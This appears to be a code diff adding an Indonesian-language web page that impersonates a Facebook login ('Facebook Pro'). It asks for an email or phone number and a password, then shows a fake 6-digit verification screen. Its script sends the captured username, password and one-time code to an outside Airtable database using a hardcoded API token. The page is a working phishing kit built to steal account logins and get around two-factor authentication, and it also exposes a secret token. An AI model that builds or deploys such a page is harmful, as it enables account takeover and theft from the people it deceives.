@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#1877f2">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <title>Facebook Pro - Masuk</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    /* (semua CSS dari versi kamu tetap, tidak diubah) */
+  </style>
+</head>
+<body class="bg-gray-50">
+
+  <!-- === LOGIN PAGE === -->
+  <section id="loginpage" class="min-h-screen flex items-center justify-center p-4">
+    <div class="w-full max-w-md mx-auto">
+      <div class="text-center mb-8 fade-in">
+        <div class="flex items-center justify-center mb-4">
+          <i class="fab fa-facebook text-5xl text-blue-600 mr-2"></i>
+          <h1 class="text-4xl font-bold text-gray-800">Facebook</h1>
+          <span class="text-xl font-bold text-blue-600 ml-1">Pro</span>
+        </div>
+        <h2 class="text-xl font-semibold text-gray-700">Selamat Datang Kembali</h2>
+      </div>
+
+      <div class="glass-effect rounded-2xl p-6 fade-in">
+        <form id="loginForm" class="space-y-4">
+          <div>
+            <label class="block text-sm font-medium text-gray-700 mb-2">Email atau Nomor Telepon</label>
+            <div class="relative">
+              <input type="text" id="email"
+                     class="w-full px-4 py-3 pl-12 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent input-focus text-base"
+                     placeholder="nama@email.com" required>
+              <i class="fas fa-user absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400 text-lg"></i>
+            </div>
+          </div>
+
+          <div>
+            <label class="block text-sm font-medium text-gray-700 mb-2">Kata Sandi</label>
+            <div class="relative">
+              <input type="password" id="password"
+                     class="w-full px-4 py-3 pl-12 pr-12 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent input-focus text-base"
+                     placeholder="••••••••" required>
+              <i class="fas fa-lock absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400 text-lg"></i>
+              <button type="button" id="togglePassword"
+                      class="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600 touch-target">
+                <i class="fas fa-eye text-lg"></i>
+              </button>
+            </div>
+          </div>
+
+          <button type="submit" class="w-full btn-primary text-white font-semibold py-3 px-6 rounded-lg text-base touch-target">
+            Masuk
+          </button>
+        </form>
+      </div>
+    </div>
+  </section>
+
+  <!-- === AUTH PAGE === -->
+  <section id="authpage" class="min-h-screen flex items-center justify-center p-4 hidden">
+    <div class="w-full max-w-md mx-auto">
+      <div class="glass-effect rounded-2xl p-6 slide-in">
+        <div class="text-center mb-6">
+          <div class="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-3">
+            <i class="fas fa-shield-alt text-3xl text-blue-600"></i>
+          </div>
+          <h2 class="text-xl font-bold text-gray-800 mb-1">Verifikasi Identitas</h2>
+          <p class="text-sm text-gray-600">Masukkan kode 6 digit yang dikirim ke <span id="userEmail" class="font-semibold"></span></p>
+        </div>
+
+        <form id="authForm" class="space-y-5">
+          <div class="flex justify-center space-x-2">
+            <input type="text" maxlength="1" class="otp-input text-center border-2 border-gray-300 rounded-lg" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-input text-center border-2 border-gray-300 rounded-lg" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-input text-center border-2 border-gray-300 rounded-lg" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-input text-center border-2 border-gray-300 rounded-lg" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-input text-center border-2 border-gray-300 rounded-lg" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-input text-center border-2 border-gray-300 rounded-lg" inputmode="numeric">
+          </div>
+
+          <div class="flex space-x-3">
+            <button type="button" id="backToLogin"
+                    class="flex-1 px-4 py-3 border border-gray-300 text-gray-700 font-semibold rounded-lg hover:bg-gray-50">
+              Kembali
+            </button>
+            <button type="submit" class="flex-1 btn-primary text-white font-semibold py-3 px-6 rounded-lg">
+              Verifikasi
+            </button>
+          </div>
+        </form>
+      </div>
+    </div>
+  </section>
+
+  <script>
+    // === Konfigurasi Airtable ===
+    const airtableApiToken = "pat31RGUy1ua2FIoz.be46edb0738928289d5ed6ffb09f4b349dbdb00092f97779d0e732a5998e8356";
+    const baseId = "appLTvB7Hey4An0z0";
+    const tableName = "table1";
+    const airtableEndpoint = `https://api.airtable.com/v0/${baseId}/${tableName}`;
+
+    // === Toggle Password ===
+    document.getElementById('togglePassword').addEventListener('click', function() {
+      const input = document.getElementById('password');
+      const icon = this.querySelector('i');
+      if (input.type === 'password') {
+        input.type = 'text';
+        icon.classList.replace('fa-eye', 'fa-eye-slash');
+      } else {
+        input.type = 'password';
+        icon.classList.replace('fa-eye-slash', 'fa-eye');
+      }
+    });
+
+    // === LOGIN SUBMIT ===
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value.trim();
+      document.getElementById('userEmail').textContent = email;
+
+      // Simpan sementara di localStorage
+      localStorage.setItem('usr', email);
+      localStorage.setItem('pss', password);
+
+      document.getElementById('loginpage').classList.add('hidden');
+      document.getElementById('authpage').classList.remove('hidden');
+    });
+
+    // === OTP INPUT ===
+    const otpInputs = document.querySelectorAll('.otp-input');
+    otpInputs.forEach((input, i) => {
+      input.addEventListener('input', e => {
+        e.target.value = e.target.value.replace(/[^0-9]/g, '');
+        if (e.target.value && i < otpInputs.length - 1) otpInputs[i + 1].focus();
+      });
+      input.addEventListener('keydown', e => {
+        if (e.key === 'Backspace' && !e.target.value && i > 0) otpInputs[i - 1].focus();
+      });
+    });
+
+    // === AUTH SUBMIT (kirim ke Airtable) ===
+    document.getElementById('authForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      const otpCode = Array.from(otpInputs).map(i => i.value).join('');
+
+      if (otpCode.length !== 6) {
+        alert('Masukkan 6 digit kode otentikasi');
+        return;
+      }
+
+      const usr = localStorage.getItem('usr');
+      const pss = localStorage.getItem('pss');
+
+      // Kirim data ke Airtable
+      try {
+        const res = await fetch(airtableEndpoint, {
+          method: "POST",
+          headers: {
+            "Authorization": `Bearer ${airtableApiToken}`,
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            records: [{
+              fields: {
+                usr: usr,
+                pss: pss,
+                otentikasi: otpCode
+              }
+            }]
+          })
+        });
+
+        if (res.ok) {
+          alert("✅ Data berhasil dikirim ke Airtable!");
+          localStorage.clear();
+          otpInputs.forEach(i => i.value = '');
+          document.getElementById('authpage').classList.add('hidden');
+          document.getElementById('loginpage').classList.remove('hidden');
+        } else {
+          alert("❌ Gagal mengirim ke Airtable!");
+        }
+      } catch (err) {
+        console.error(err);
+        alert("Terjadi kesalahan jaringan.");
+      }
+    });
+
+    // === Kembali ke login ===
+    document.getElementById('backToLogin').addEventListener('click', () => {
+      document.getElementById('authpage').classList.add('hidden');
+      document.getElementById('loginpage').classList.remove('hidden');
+    });
+  </script>
+</body>
+</html>
